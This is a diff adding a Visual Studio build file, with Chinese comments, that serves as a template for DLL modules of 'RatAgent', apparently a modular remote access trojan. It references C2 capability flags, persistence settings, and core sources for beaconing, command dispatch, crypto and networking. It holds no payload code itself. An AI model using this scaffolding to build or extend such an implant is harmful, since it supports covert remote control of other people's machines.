@@ -1,0 +1,128 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  RatAgent.template.vcxproj — 模块工程模板（DLL 形态）
+
+  复制本目录开新模块时改这几处：
+    1) RatAgentModuleId / RatAgentModuleCaps（下面的 RatAgentSwitches）
+    2) TargetName（产物名，约定 RatAgent.<module>）
+    3) ProjectGuid（换成新的唯一 GUID）
+    4) 源文件清单里加上你自己的 *.cpp（本模板只有 caps.cpp）
+
+  注意：**共享 core**（..\..\core），不要复制一份 core 出来——否则以后协议/加密一改
+  就要同步 N 份。加/减能力只改 caps.cpp，不改 core。
+-->
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>17.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{7E3A1C10-0001-4B2E-9C31-000000000001}</ProjectGuid>
+    <RootNamespace>RatAgentTemplate</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v145</PlatformToolset>
+    <CharacterSet>MultiByte</CharacterSet>
+    <TargetName>RatAgent.template</TargetName>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v145</PlatformToolset>
+    <CharacterSet>MultiByte</CharacterSet>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <TargetName>RatAgent.template</TargetName>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <!-- 模块标识：本工程**写死成自己的**，不要依赖默认值（默认是 full，会和全量 agent 撞名） -->
+  <PropertyGroup Label="RatAgentSwitches">
+    <RatAgentModuleId>template</RatAgentModuleId>
+    <RatAgentModuleCaps>(c2::kCapSys)</RatAgentModuleCaps>
+    <RatAgentDebug Condition="'$(RatAgentDebug)' == ''">1</RatAgentDebug>
+    <RatAgentPersistId Condition="'$(RatAgentPersistId)' == ''">$(RatAgentDebug)</RatAgentPersistId>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_USRDLL;RAT_AGENT_DLL;RAT_MODULE_ID="$(RatAgentModuleId)";RAT_MODULE_CAPS=$(RatAgentModuleCaps);RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+      <AdditionalOptions>/utf-8 %(AdditionalOptions)</AdditionalOptions>
+      <!-- 共享 core 的头文件搜索路径（模块工程的 caps.cpp 不在 core 目录里） -->
+      <AdditionalIncludeDirectories>$(ProjectDir)..\..\core;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <Optimization>Disabled</Optimization>
+      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
+      <ProgramDataBaseFileName>$(OutDir)RatAgent.template.pdb</ProgramDataBaseFileName>
+      <TreatWarningAsError>false</TreatWarningAsError>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <ProgramDatabaseFile>$(OutDir)RatAgent.template.pdb</ProgramDatabaseFile>
+      <ImportLibrary>$(OutDir)RatAgent.template.lib</ImportLibrary>
+      <LinkIncremental>false</LinkIncremental>
+      <!-- 模板不带屏幕能力，因此不需要 windowscodecs（WIC） -->
+      <AdditionalDependencies>ws2_32.lib;bcrypt.lib;winhttp.lib;dxgi.lib;%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_USRDLL;RAT_AGENT_DLL;RAT_MODULE_ID="$(RatAgentModuleId)";RAT_MODULE_CAPS=$(RatAgentModuleCaps);RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+      <AdditionalOptions>/utf-8 %(AdditionalOptions)</AdditionalOptions>
+      <AdditionalIncludeDirectories>$(ProjectDir)..\..\core;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <ProgramDataBaseFileName>$(OutDir)RatAgent.template.pdb</ProgramDataBaseFileName>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <ProgramDatabaseFile>$(OutDir)RatAgent.template.pdb</ProgramDatabaseFile>
+      <ImportLibrary>$(OutDir)RatAgent.template.lib</ImportLibrary>
+      <AdditionalDependencies>ws2_32.lib;bcrypt.lib;winhttp.lib;dxgi.lib;%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <!-- 本模块自己的源文件 -->
+    <ClCompile Include="caps.cpp" />
+    <!-- 共享 core（不要复制，直接引用） -->
+    <ClCompile Include="..\..\core\agent_dll.cpp" />
+    <ClCompile Include="..\..\core\agent_runtime.cpp" />
+    <ClCompile Include="..\..\core\capability.cpp" />
+    <ClCompile Include="..\..\core\protocol.cpp" />
+    <ClCompile Include="..\..\core\crypto.cpp" />
+    <ClCompile Include="..\..\core\net.cpp" />
+    <ClCompile Include="..\..\core\session.cpp" />
+    <ClCompile Include="..\..\core\cmd_dispatch.cpp" />
+    <ClCompile Include="..\..\core\beacon.cpp" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
